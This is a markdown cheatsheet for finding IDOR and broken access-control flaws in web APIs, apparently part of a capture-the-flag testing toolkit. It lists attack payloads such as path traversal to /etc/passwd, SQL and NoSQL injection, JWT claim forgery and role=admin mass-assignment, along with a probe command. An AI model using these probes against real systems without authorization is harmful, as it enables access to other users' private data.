# Cheatsheet — the quick reference

---

## The proof

Two identities → B reads/writes A's private object → the response
carries A's attributable marker → `confirms`.

## The one-liner

```bash
# A creates an object (id=1001), B requests it
python3 tools/web/http_probe.py --challenge "$C" --class web-idor \
  --url "$BASE/api/notes/1001" --header "Cookie: session=$B" \
  --evidence-regex '"owner_id"\s*:\s*1|"email"\s*:\s*"a@' \
  --evidence-kind impact --on-match confirms --on-miss refutes
```

## The probe matrix

| Signal | Probe | Win |
|---|---|---|
| sequential id | `id_sweep --range` | another's object |
| b64 `Type:id` | decode → change → encode | privileged node |
| uuid v1/v5 | recompute from known | predictable id |
| ObjectId | ts+rand+counter | counter enumerate |
| collection `?user_id=` | param override | another's objects |
| bulk `?ids=` / `POST /bulk` | other ids | batch leak |
| `.json`/`.xml` | format variant | format-skips-check |
| PUT/PATCH/DELETE | method variant | write-IDOR |
| nested `/parent/child` | parent-only check | child reachable |
| mass-assign `{"role"}` | bind the field | role=admin |
| `/admin/*` | function-level | privileged function |
| `?file=`/`?doc=` | traversal / adjacent file | file read |
| JWT `sub`/`role` | forge the claim | another's identity |
| GraphQL `node(id:)` | node access | any object |
| export/report `user_id` | second-order | job reads it |
| `?include_private` | flag | private included |
| `?scope=all` | scope flag | all objects |
| `?fields=role,secret` | field-list | privileged columns |
| `X-User-Id:` header | header override | another's identity |
| `?role=admin` param | param check | privileged |
| `Cookie: role=admin` | cookie check | privileged |
| `/api/v2/` vs `/api/v1/` | version variant | unguarded version |
| `//admin` / `/admin/` | path normalization | alias bypass |
| `HEAD`/`OPTIONS`/`TRACE` | method | method-skips-check |
| `?user_id=1&user_id=2` | param pollution | first/last wins |
| `?id[]=1` / `{"id":[1]}` | type-coerce | check-string mismatch |
| `{"id":{"$ne":0}}` | NoSQL op | object-filter bypass |
| `?id=' OR '1'='1` | SQLi in id | query bypass |
| `?file=../../etc/passwd` | traversal | file read |
| `?id=uuid-v4` (leak) | the leak source | enumerable via leak |
| second-order `export {id}` | job/bot/render | backend reads it |
| `Referer:`/`Origin:` id | the trusted header | header-as-id |

## The format → probe table

| Id format | Predict? | Sweep? | Recompute? |
|---|---|---|---|
| auto-increment | no | yes (`id_sweep`) | — |
| padded `0042` | no | yes (zfill) | — |
| prefixed `order_42` | no | yes (mutate) | — |
| epoch ts | yes | yes | yes |
| UUID v1 | partial | — | yes (ts+MAC) |
| UUID v4 | no | — | need the leak |
| UUID v5 | — | — | yes (ns+name) |
| ObjectId | partial | — | yes (ts+counter) |
| Snowflake | partial | — | yes |
| ULID | partial | — | yes |
| b64 `Type:id` | — | — | yes (decode-encode) |
| hash-of-name | — | — | yes (recompute) |
| opaque token | no | — | need the leak |
| nanoid | no | — | need the leak |

## The `pre-probe` → `post-probe` → `pre-flag` discipline

```bash
python3 tools/hooks.py pre-probe "$C" --class web-idor \
  --request "GET /api/notes/1001" --hypothesis-id H1
# ... the request ...
python3 tools/hooks.py post-probe "$C" --class web-idor \
  --hypothesis-id H1 --verdict confirms --evidence-kind impact \
  --evidence '"owner_id":1' --response '...the bytes...'
python3 tools/hooks.py pre-flag "$C" --value 'flag{...}' \
  --source "$BASE/api/notes/1001" --evidence '...the bytes that carried it...'
```

## The "don't" list

- Don't sweep before the two-identity probe.
- Don't test write on a third party's object.
- Don't claim `200 {}` — need attributable data.
- Don't claim `200` on a public object.
- Don't claim `404`/`302` — those are ambiguous, not proof.
- Don't trust `id=1` alone — `1` might be public.
- Don't sweep a uuid v4 — it's 122 bits.
- Don't forget the carrier — `?id`, body, header, cookie, JWT, GraphQL.
- Don't forget the method — `GET`, `PUT`, `PATCH`, `DELETE`, `POST`,
  `HEAD`, `OPTIONS`, `TRACE`.
- Don't forget the format — `.json`, `.xml`, `?format=`, `Accept:`.
- Don't forget the scope flag — `?all`, `?include_private`, `?scope=all`.
- Don't forget the field-list — `?fields=`, `?include=`, `?select=`.
- Don't forget the relation — `?expand=user.role`, `?populate=`.
- Don't forget the mount — `/api/`, `/api/v2/`, `/internal/`, `/_/`,
  `/-/`, `/.admin/`.
- Don't forget the normalization — `//admin`, `/admin/`, `;param`,
  `%2f`, the case.
- Don't forget the param pollution — `?id=1&id=2`, `?id[]=1`.
- Don't forget the type-coerce — `[1]`, `{"$ne":0}`, `{"$gt":0}`.
- Don't forget the second-order — export, render, bot, job, webhook.
- Don't forget the JWT claim — `sub`, `uid`, `role`.
- Don't forget the mass-assign — `{"role":"admin"}`, `{"user_id":1}`.
- Don't forget the endpoint check — `/admin/`, `/internal/`, the
  feature flag, the setup route.
